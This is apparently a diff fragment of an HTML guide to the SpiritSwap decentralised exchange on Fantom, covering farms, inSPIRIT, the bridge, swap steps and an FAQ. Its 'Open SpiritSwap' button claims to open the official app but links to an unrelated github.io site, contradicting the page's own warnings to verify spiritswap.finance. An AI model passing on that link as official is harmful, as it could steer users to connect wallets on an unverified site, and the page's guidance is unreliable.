noreferrer">slippage</a>, especially for long-tail tokens. Searchers comparing SpiritSwap fees should check route, liquidity depth, token contract, and price impact before confirming a swap.</div></div></section><section class="section section-alt"><div class="container"><h2>SpiritSwap farms and inSPIRIT rewards</h2><div class="intent-a">SpiritSwap farms reward liquidity providers with SPIRIT and connect to the inSPIRIT locking model. The official site says SPIRIT can be used to invest, vote, boost farm rewards, and participate in governance. inSPIRIT is tied to three value propositions described by the project: boosted farm emissions, a share of revenue from DEX swaps, and governance participation through voting and proposals. <a class="inline-link" href="https://docs.silverswap.io/spirit-swap/farm.md" rel="noopener noreferrer">Farm APRs</a> are not fixed because they depend on emissions, pool liquidity, token prices, and trading fees. Users should compare gross APR with <a class="inline-link" href="https://www.binance.com/en/academy/article/impermanent-loss-explained" rel="noopener noreferrer">impermanent loss</a> and token exposure.</div></div></section><section class="section"><div class="container"><h2>SpiritSwap bridge to Fantom</h2><div class="intent-a">SpiritSwap includes a bridge interface intended to help users move assets into Fantom from other chains. The official site describes SpiritBridge as a <a class="inline-link" href="https://messari.io/report/state-of-bridges-q2-2023" rel="noopener noreferrer">bridge aggregator</a> for routes from chains such as Ethereum, Avalanche, Terra, and Arbitrum, though available routes and providers can change. The important workflow is to bridge the correct asset to Fantom, keep enough FTM for gas, and then swap or provide liquidity on SpiritSwap. Bridge users should verify destination chain, <a class="inline-link" href="https://www.coindesk.com/learn/what-are-wrapped-tokens/" rel="noopener noreferrer">wrapped asset</a> type, minimum received amount, and bridge provider before signing.</div></div></section>
+  <section class="section"><div class="container"><h2>How to swap SpiritSwap</h2><ol class="steps"><li><b>Open the swap route</b><span>Use the official app route on spiritswap.finance and verify the domain before connecting a wallet.</span></li><li><b>Connect a Fantom wallet</b><span>Connect a compatible wallet and confirm the app is set to the Fantom network.</span></li><li><b>Choose tokens</b><span>Select the token you want to spend, the token you want to receive, and the amount.</span></li><li><b>Review and sign</b><span>Check route, slippage, price impact, token addresses, and wallet prompts before confirming.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official SpiritSwap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open SpiritSwap ↗</a></div></div></section>
+  <section class="section"><div class="container"><h2>SpiritSwap vs other Fantom DEXs</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>SpiritSwap</th><th>Alternative</th></tr></thead><tbody><tr><td>Core chain</td><td>Fantom</td><td>Fantom or multi-chain</td></tr><tr><td>Token</td><td>SPIRIT and inSPIRIT</td><td>BOO or other DEX tokens</td></tr><tr><td>Features</td><td>Swap, farms, bridge, inSPIRIT</td><td>Swap, farms, launch features vary</td></tr><tr><td><a class="inline-link" href="https://docs.silverswap.io/spirit-swap/swap.md" rel="noopener noreferrer">Routing decision</a></td><td>Best when quoted liquidity is strong</td><td>Use when price impact is lower</td></tr></tbody></table></div></div></section>
+  <section class="section section-alt" id="faq"><div class="container"><h2>SpiritSwap FAQ</h2><div class="faq-list"><details open><summary><h3>What is SpiritSwap used for?</h3></summary><div>SpiritSwap is used to swap Fantom-based tokens, provide liquidity, farm rewards, bridge assets into Fantom, and lock SPIRIT into inSPIRIT. It is a Fantom DeFi hub rather than a custodial exchange. Users connect a wallet, approve token spending, and interact with smart contracts directly.</div></details><details><summary><h3>What is SPIRIT on SpiritSwap?</h3></summary><div>SPIRIT is the SpiritSwap protocol token. It is used in farming incentives and can be locked into inSPIRIT for boost, revenue-sharing, and governance-related functions described by the protocol. Like other DEX tokens, SPIRIT's market price and liquidity can be volatile, so token exposure matters when farming or locking.</div></details><details><summary><h3>Does SpiritSwap only run on Fantom?</h3></summary><div>SpiritSwap is primarily a Fantom Opera DEX. The protocol's core swap and farm activity is centered on Fantom, though its bridge interface helps users move assets from other chains into Fantom. Users should make sure their wallet is on Fantom before trying to trade or provide liquidity.</div></details><details><summary><h3>How do SpiritSwap farms work?</h3></summary><div>SpiritSwap farms reward users who deposit <a class="inline-link" href="https://www.coingecko.com/learn/what-are-liquidity-pool-tokens-lp-tokens" rel="noopener noreferrer">liquidity pool tokens</a>. The pool earns swap fees when trades occur, and farms may distribute SPIRIT incentives. Returns vary by pool volume, liquidity, emissions, token price, and impermanent loss. A high displayed APR can fall quickly if token prices move or more liquidity enters.</div></details><details><summary><h3>What is inSPIRIT?</h3></summary><div>inSPIRIT is the locked SPIRIT position used in SpiritSwap's boost, reward-sharing, and governance model. The official site describes inSPIRIT as giving participants farm-emission boosts, a share of DEX swap revenue, and voting participation. Locking reduces liquidity, so users should understand lock duration and opportunity cost first.</div></details><details><summary><h3>Is SpiritSwap audited?</h3></summary><div>The SpiritSwap site references audits and links audit-related repositories. Audit coverage can reduce some smart-contract uncertainty, but it does not remove all risk. Users still need to consider token approvals, bridge risk, pool liquidity, price impact, farm emissions, and the possibility of interacting with fake tokens or duplicate domains.</div></details></div></div></section>
 </main>
 <footer class="site-footer"><div class="container">
-<nav aria-label="Footer" class="footer-nav"><a href="#how-it-works">How it works</a><a href="#fees-security">Fees security</a><a href="#current-context">Current context</a><a href="#core-surfaces">Core surfaces</a><a href="#fantom-assets">Fantom assets</a><a href="#faq">FAQ</a></nav>
-<p class="footer-note">Not the official SpiritSwap app — verify the domain before connecting a wallet. Information on this page is for educational purposes only and is not financial advice.</p>
-<p class="footer-meta"><a href="#top">Back to top ↑</a></p>
+  <div class="footer-grid"></div>
+  <p class="footer-note">Not the official app; verify spiritswap.finance before connecting a wallet. Educational only, not financial advice.</p>
+  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
 </div></footer>
-<script defer="" src="static/app.js"></script>
+<script src="static/app.js" defer></script>
 </body></html>
